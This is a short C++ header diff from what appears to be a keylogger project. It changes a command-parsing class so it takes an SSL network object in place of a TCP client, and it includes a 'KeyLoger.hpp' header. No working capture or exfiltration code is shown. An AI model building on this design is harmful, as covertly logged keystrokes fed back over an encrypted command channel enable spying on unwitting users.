@@ -4,16 +4,16 @@
 #include "Protocol.hpp"
 #include "KeyLoger.hpp"
 
-class TCPClient;
+class SSLNetwork;
 
 class Parser
 {
 public:
-	Parser(TCPClient &);
+	Parser(SSLNetwork &);
 	~Parser();
 	void parseCommands();
 private:
-	TCPClient &m_client;
+	SSLNetwork &m_client;
 	char m_buffer[sizeof(t_cmd)];
 };
 
